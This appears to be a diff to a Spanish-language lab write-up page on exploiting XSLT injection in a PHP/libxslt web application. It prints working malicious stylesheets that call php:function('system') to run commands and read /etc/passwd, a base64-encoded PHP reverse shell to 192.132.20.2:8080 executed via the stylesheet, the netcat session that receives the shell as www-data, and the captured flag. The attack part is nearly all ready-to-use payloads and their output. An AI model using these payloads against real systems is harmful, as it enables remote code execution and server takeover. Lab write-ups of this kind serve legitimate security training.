@@ -67,6 +67,157 @@
       <section id="main_content">
         <h1 id="xslt-to-code-execution">XSLT to Code Execution</h1>
 
+<h3 id="enumeración-y-detección-de-web">Enumeración y detección de web</h3>
+<p><img src="./assets/images/xslt_enum_web.png" alt="enum y web" /></p>
+
+<h3 id="test-web">Test web</h3>
+
+<p>test.xml</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="nt">&lt;root&gt;</span>f0ns1!<span class="nt">&lt;/root&gt;</span>
+</code></pre></div></div>
+<p>test.xsl</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xsl:stylesheet</span> <span class="na">version=</span><span class="s">"1.0"</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;xsl:output</span> <span class="na">method=</span><span class="s">"html"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;h2&gt;</span>XSLT Engine Info:<span class="nt">&lt;/h2&gt;</span>
+    <span class="nt">&lt;b&gt;</span>Version:<span class="nt">&lt;/b&gt;&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"system-property('xsl:version')"</span> <span class="nt">/&gt;&lt;br/&gt;</span>
+    <span class="nt">&lt;b&gt;</span>Vendor:<span class="nt">&lt;/b&gt;&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"system-property('xsl:vendor')"</span> <span class="nt">/&gt;&lt;br/&gt;</span>
+    <span class="nt">&lt;b&gt;</span>Vendor URL:<span class="nt">&lt;/b&gt;&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"system-property('xsl:vendor-url')"</span> <span class="nt">/&gt;&lt;br/&gt;</span>
+    <span class="nt">&lt;/xsl:template&gt;</span>
+<span class="nt">&lt;/xsl:stylesheet&gt;</span>
+</code></pre></div></div>
+
+<p>otuput:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>XSLT Engine Info:
+Version: 1.0
+Vendor: libxslt
+Vendor URL: http://xmlsoft.org/XSLT/ 
+
+</code></pre></div></div>
+
+<h3 id="execute-remote-commands">Execute remote commands</h3>
+
+<p>test_injection.xslt</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xsl:stylesheet</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span> <span class="na">xmlns:php=</span><span class="s">"http://php.net/xsl"</span>
+<span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
+<span class="c">&lt;!-- We add the PHP's xmlns --&gt;</span>
+    <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;html&gt;</span>
+            <span class="c">&lt;!-- We use the php suffix to call the functions --&gt;</span>
+            <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"php:function('system','uname -a')"</span> <span class="nt">/&gt;</span>
+            <span class="c">&lt;!-- Output: 'Php Can Now Be Used In Xsl' --&gt;</span>
+        <span class="nt">&lt;/html&gt;</span>
+    <span class="nt">&lt;/xsl:template&gt;</span>
+<span class="nt">&lt;/xsl:stylesheet&gt;</span>
+
+</code></pre></div></div>
+
+<p>output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Linux demo.ine.local 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul 5 10:34:03 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux Linux demo.ine.local 6.8.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul 5 10:34:03 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux 
+</code></pre></div></div>
+
+<p>test_injection2.xsl</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xsl:stylesheet</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span> <span class="na">xmlns:php=</span><span class="s">"http://php.net/xsl"</span>
+<span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
+<span class="c">&lt;!-- We add the PHP's xmlns --&gt;</span>
+    <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;html&gt;</span>
+            <span class="c">&lt;!-- We use the php suffix to call the functions --&gt;</span>
+                <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"php:function('system','cat /etc/passwd')"</span> <span class="nt">/&gt;</span>                                                                                                          
+            <span class="c">&lt;!-- Output: 'Php Can Now Be Used In Xsl' --&gt;</span>
+        <span class="nt">&lt;/html&gt;</span>
+    <span class="nt">&lt;/xsl:template&gt;</span>
+<span class="nt">&lt;/xsl:stylesheet&gt;</span>
+
+</code></pre></div></div>
+<p>output:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+&lt;?xml version="1.0"?&gt;
+&lt;html xmlns:php="http://php.net/xsl"&gt;syslog:x:101:104::/home/syslog:/bin/false&lt;/html&gt;
+</code></pre></div></div>
+
+<h3 id="remote-access">Remote access:</h3>
+
+<p>shell reversa en php:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:~/xslt# <span class="nb">cat </span>test_php  <span class="nb">base64
+</span>php <span class="nt">-r</span> <span class="s1">'$sock=fsockopen("192.132.20.2",8080);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+<span class="nb">cat</span>: <span class="nb">base64</span>: No such file or directory
+root@INE:~/xslt# <span class="nb">cat </span>test_php | <span class="nb">base64
+</span>cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xMzIuMjAuMiIsODA4MCk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsnCg<span class="o">==</span>
+</code></pre></div></div>
+
+<p>xsl malicioso:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xsl:stylesheet</span> <span class="na">xmlns:xsl=</span><span class="s">"http://www.w3.org/1999/XSL/Transform"</span> <span class="na">xmlns:php=</span><span class="s">"http://php.net/xsl"</span>
+<span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
+<span class="c">&lt;!-- We add the PHP's xmlns --&gt;</span>
+    <span class="nt">&lt;xsl:template</span> <span class="na">match=</span><span class="s">"/"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;html&gt;</span>
+            <span class="c">&lt;!-- We use the php suffix to call the functions --&gt;</span>
+                <span class="nt">&lt;xsl:value-of</span> <span class="na">select=</span><span class="s">"php:function('system','echo cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xMzIuMjAuMiIsODA4MCk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsnCg== | base64 -d | bash')"</span> <span class="nt">/&gt;</span>
+            <span class="c">&lt;!-- Output: 'Php Can Now Be Used In Xsl' --&gt;</span>
+        <span class="nt">&lt;/html&gt;</span>
+    <span class="nt">&lt;/xsl:template&gt;</span>
+<span class="nt">&lt;/xsl:stylesheet&gt;</span>
+
+</code></pre></div></div>
+
+<p>ejecución:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@INE:~# nc <span class="nt">-nlvp</span> 8080
+Ncat: Version 7.92 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::8080
+Ncat: Listening on 0.0.0.0:8080
+Ncat: Connection from 192.132.20.3.
+Ncat: Connection from 192.132.20.3:51760.
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ hostname
+demo.ine.local
+$ pwd
+/app
+$ /bin/bash
+whoami
+www-data
+cd /home
+
+</span></code></pre></div></div>
+
+<p><img src="./assets/images/remote_access_xslt.png" alt="remote_access" /></p>
+
+<p>visualización de la flag:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> / | <span class="nb">grep </span>flag    
+<span class="nt">-rw-r--r--</span>   1 root     root       33 Jun  2  2022 flag.txt
+<span class="nv">$ </span><span class="nb">cat</span> /flag.txt
+fdf9c7da429441eaa1620eceafc34d9f
+<span class="nv">$ </span>
+
+</code></pre></div></div>
+
 <p><a href="./">back</a></p>
 
       </section>
